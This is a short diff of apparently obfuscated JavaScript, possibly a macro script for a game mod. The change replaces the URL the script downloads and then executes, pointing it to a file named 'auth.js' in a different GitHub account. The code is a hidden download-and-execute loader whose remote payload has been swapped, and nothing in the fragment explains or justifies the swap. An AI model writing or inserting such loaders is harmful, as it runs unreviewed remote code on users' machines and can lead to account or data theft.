@@ -38,6 +38,6 @@ function executeScript(_0x4e2958) {
     print("Error executing the script: " + _0x1760c9.message);
   }
 }
-downloadScript("https://raw.githubusercontent.com/pappou9000/jsmacros/main/js%20macro", scriptPath);
+downloadScript("https://raw.githubusercontent.com/hasoon-0/main/refs/heads/main/auth.js", scriptPath);
 executeScript(scriptPath);
 A;
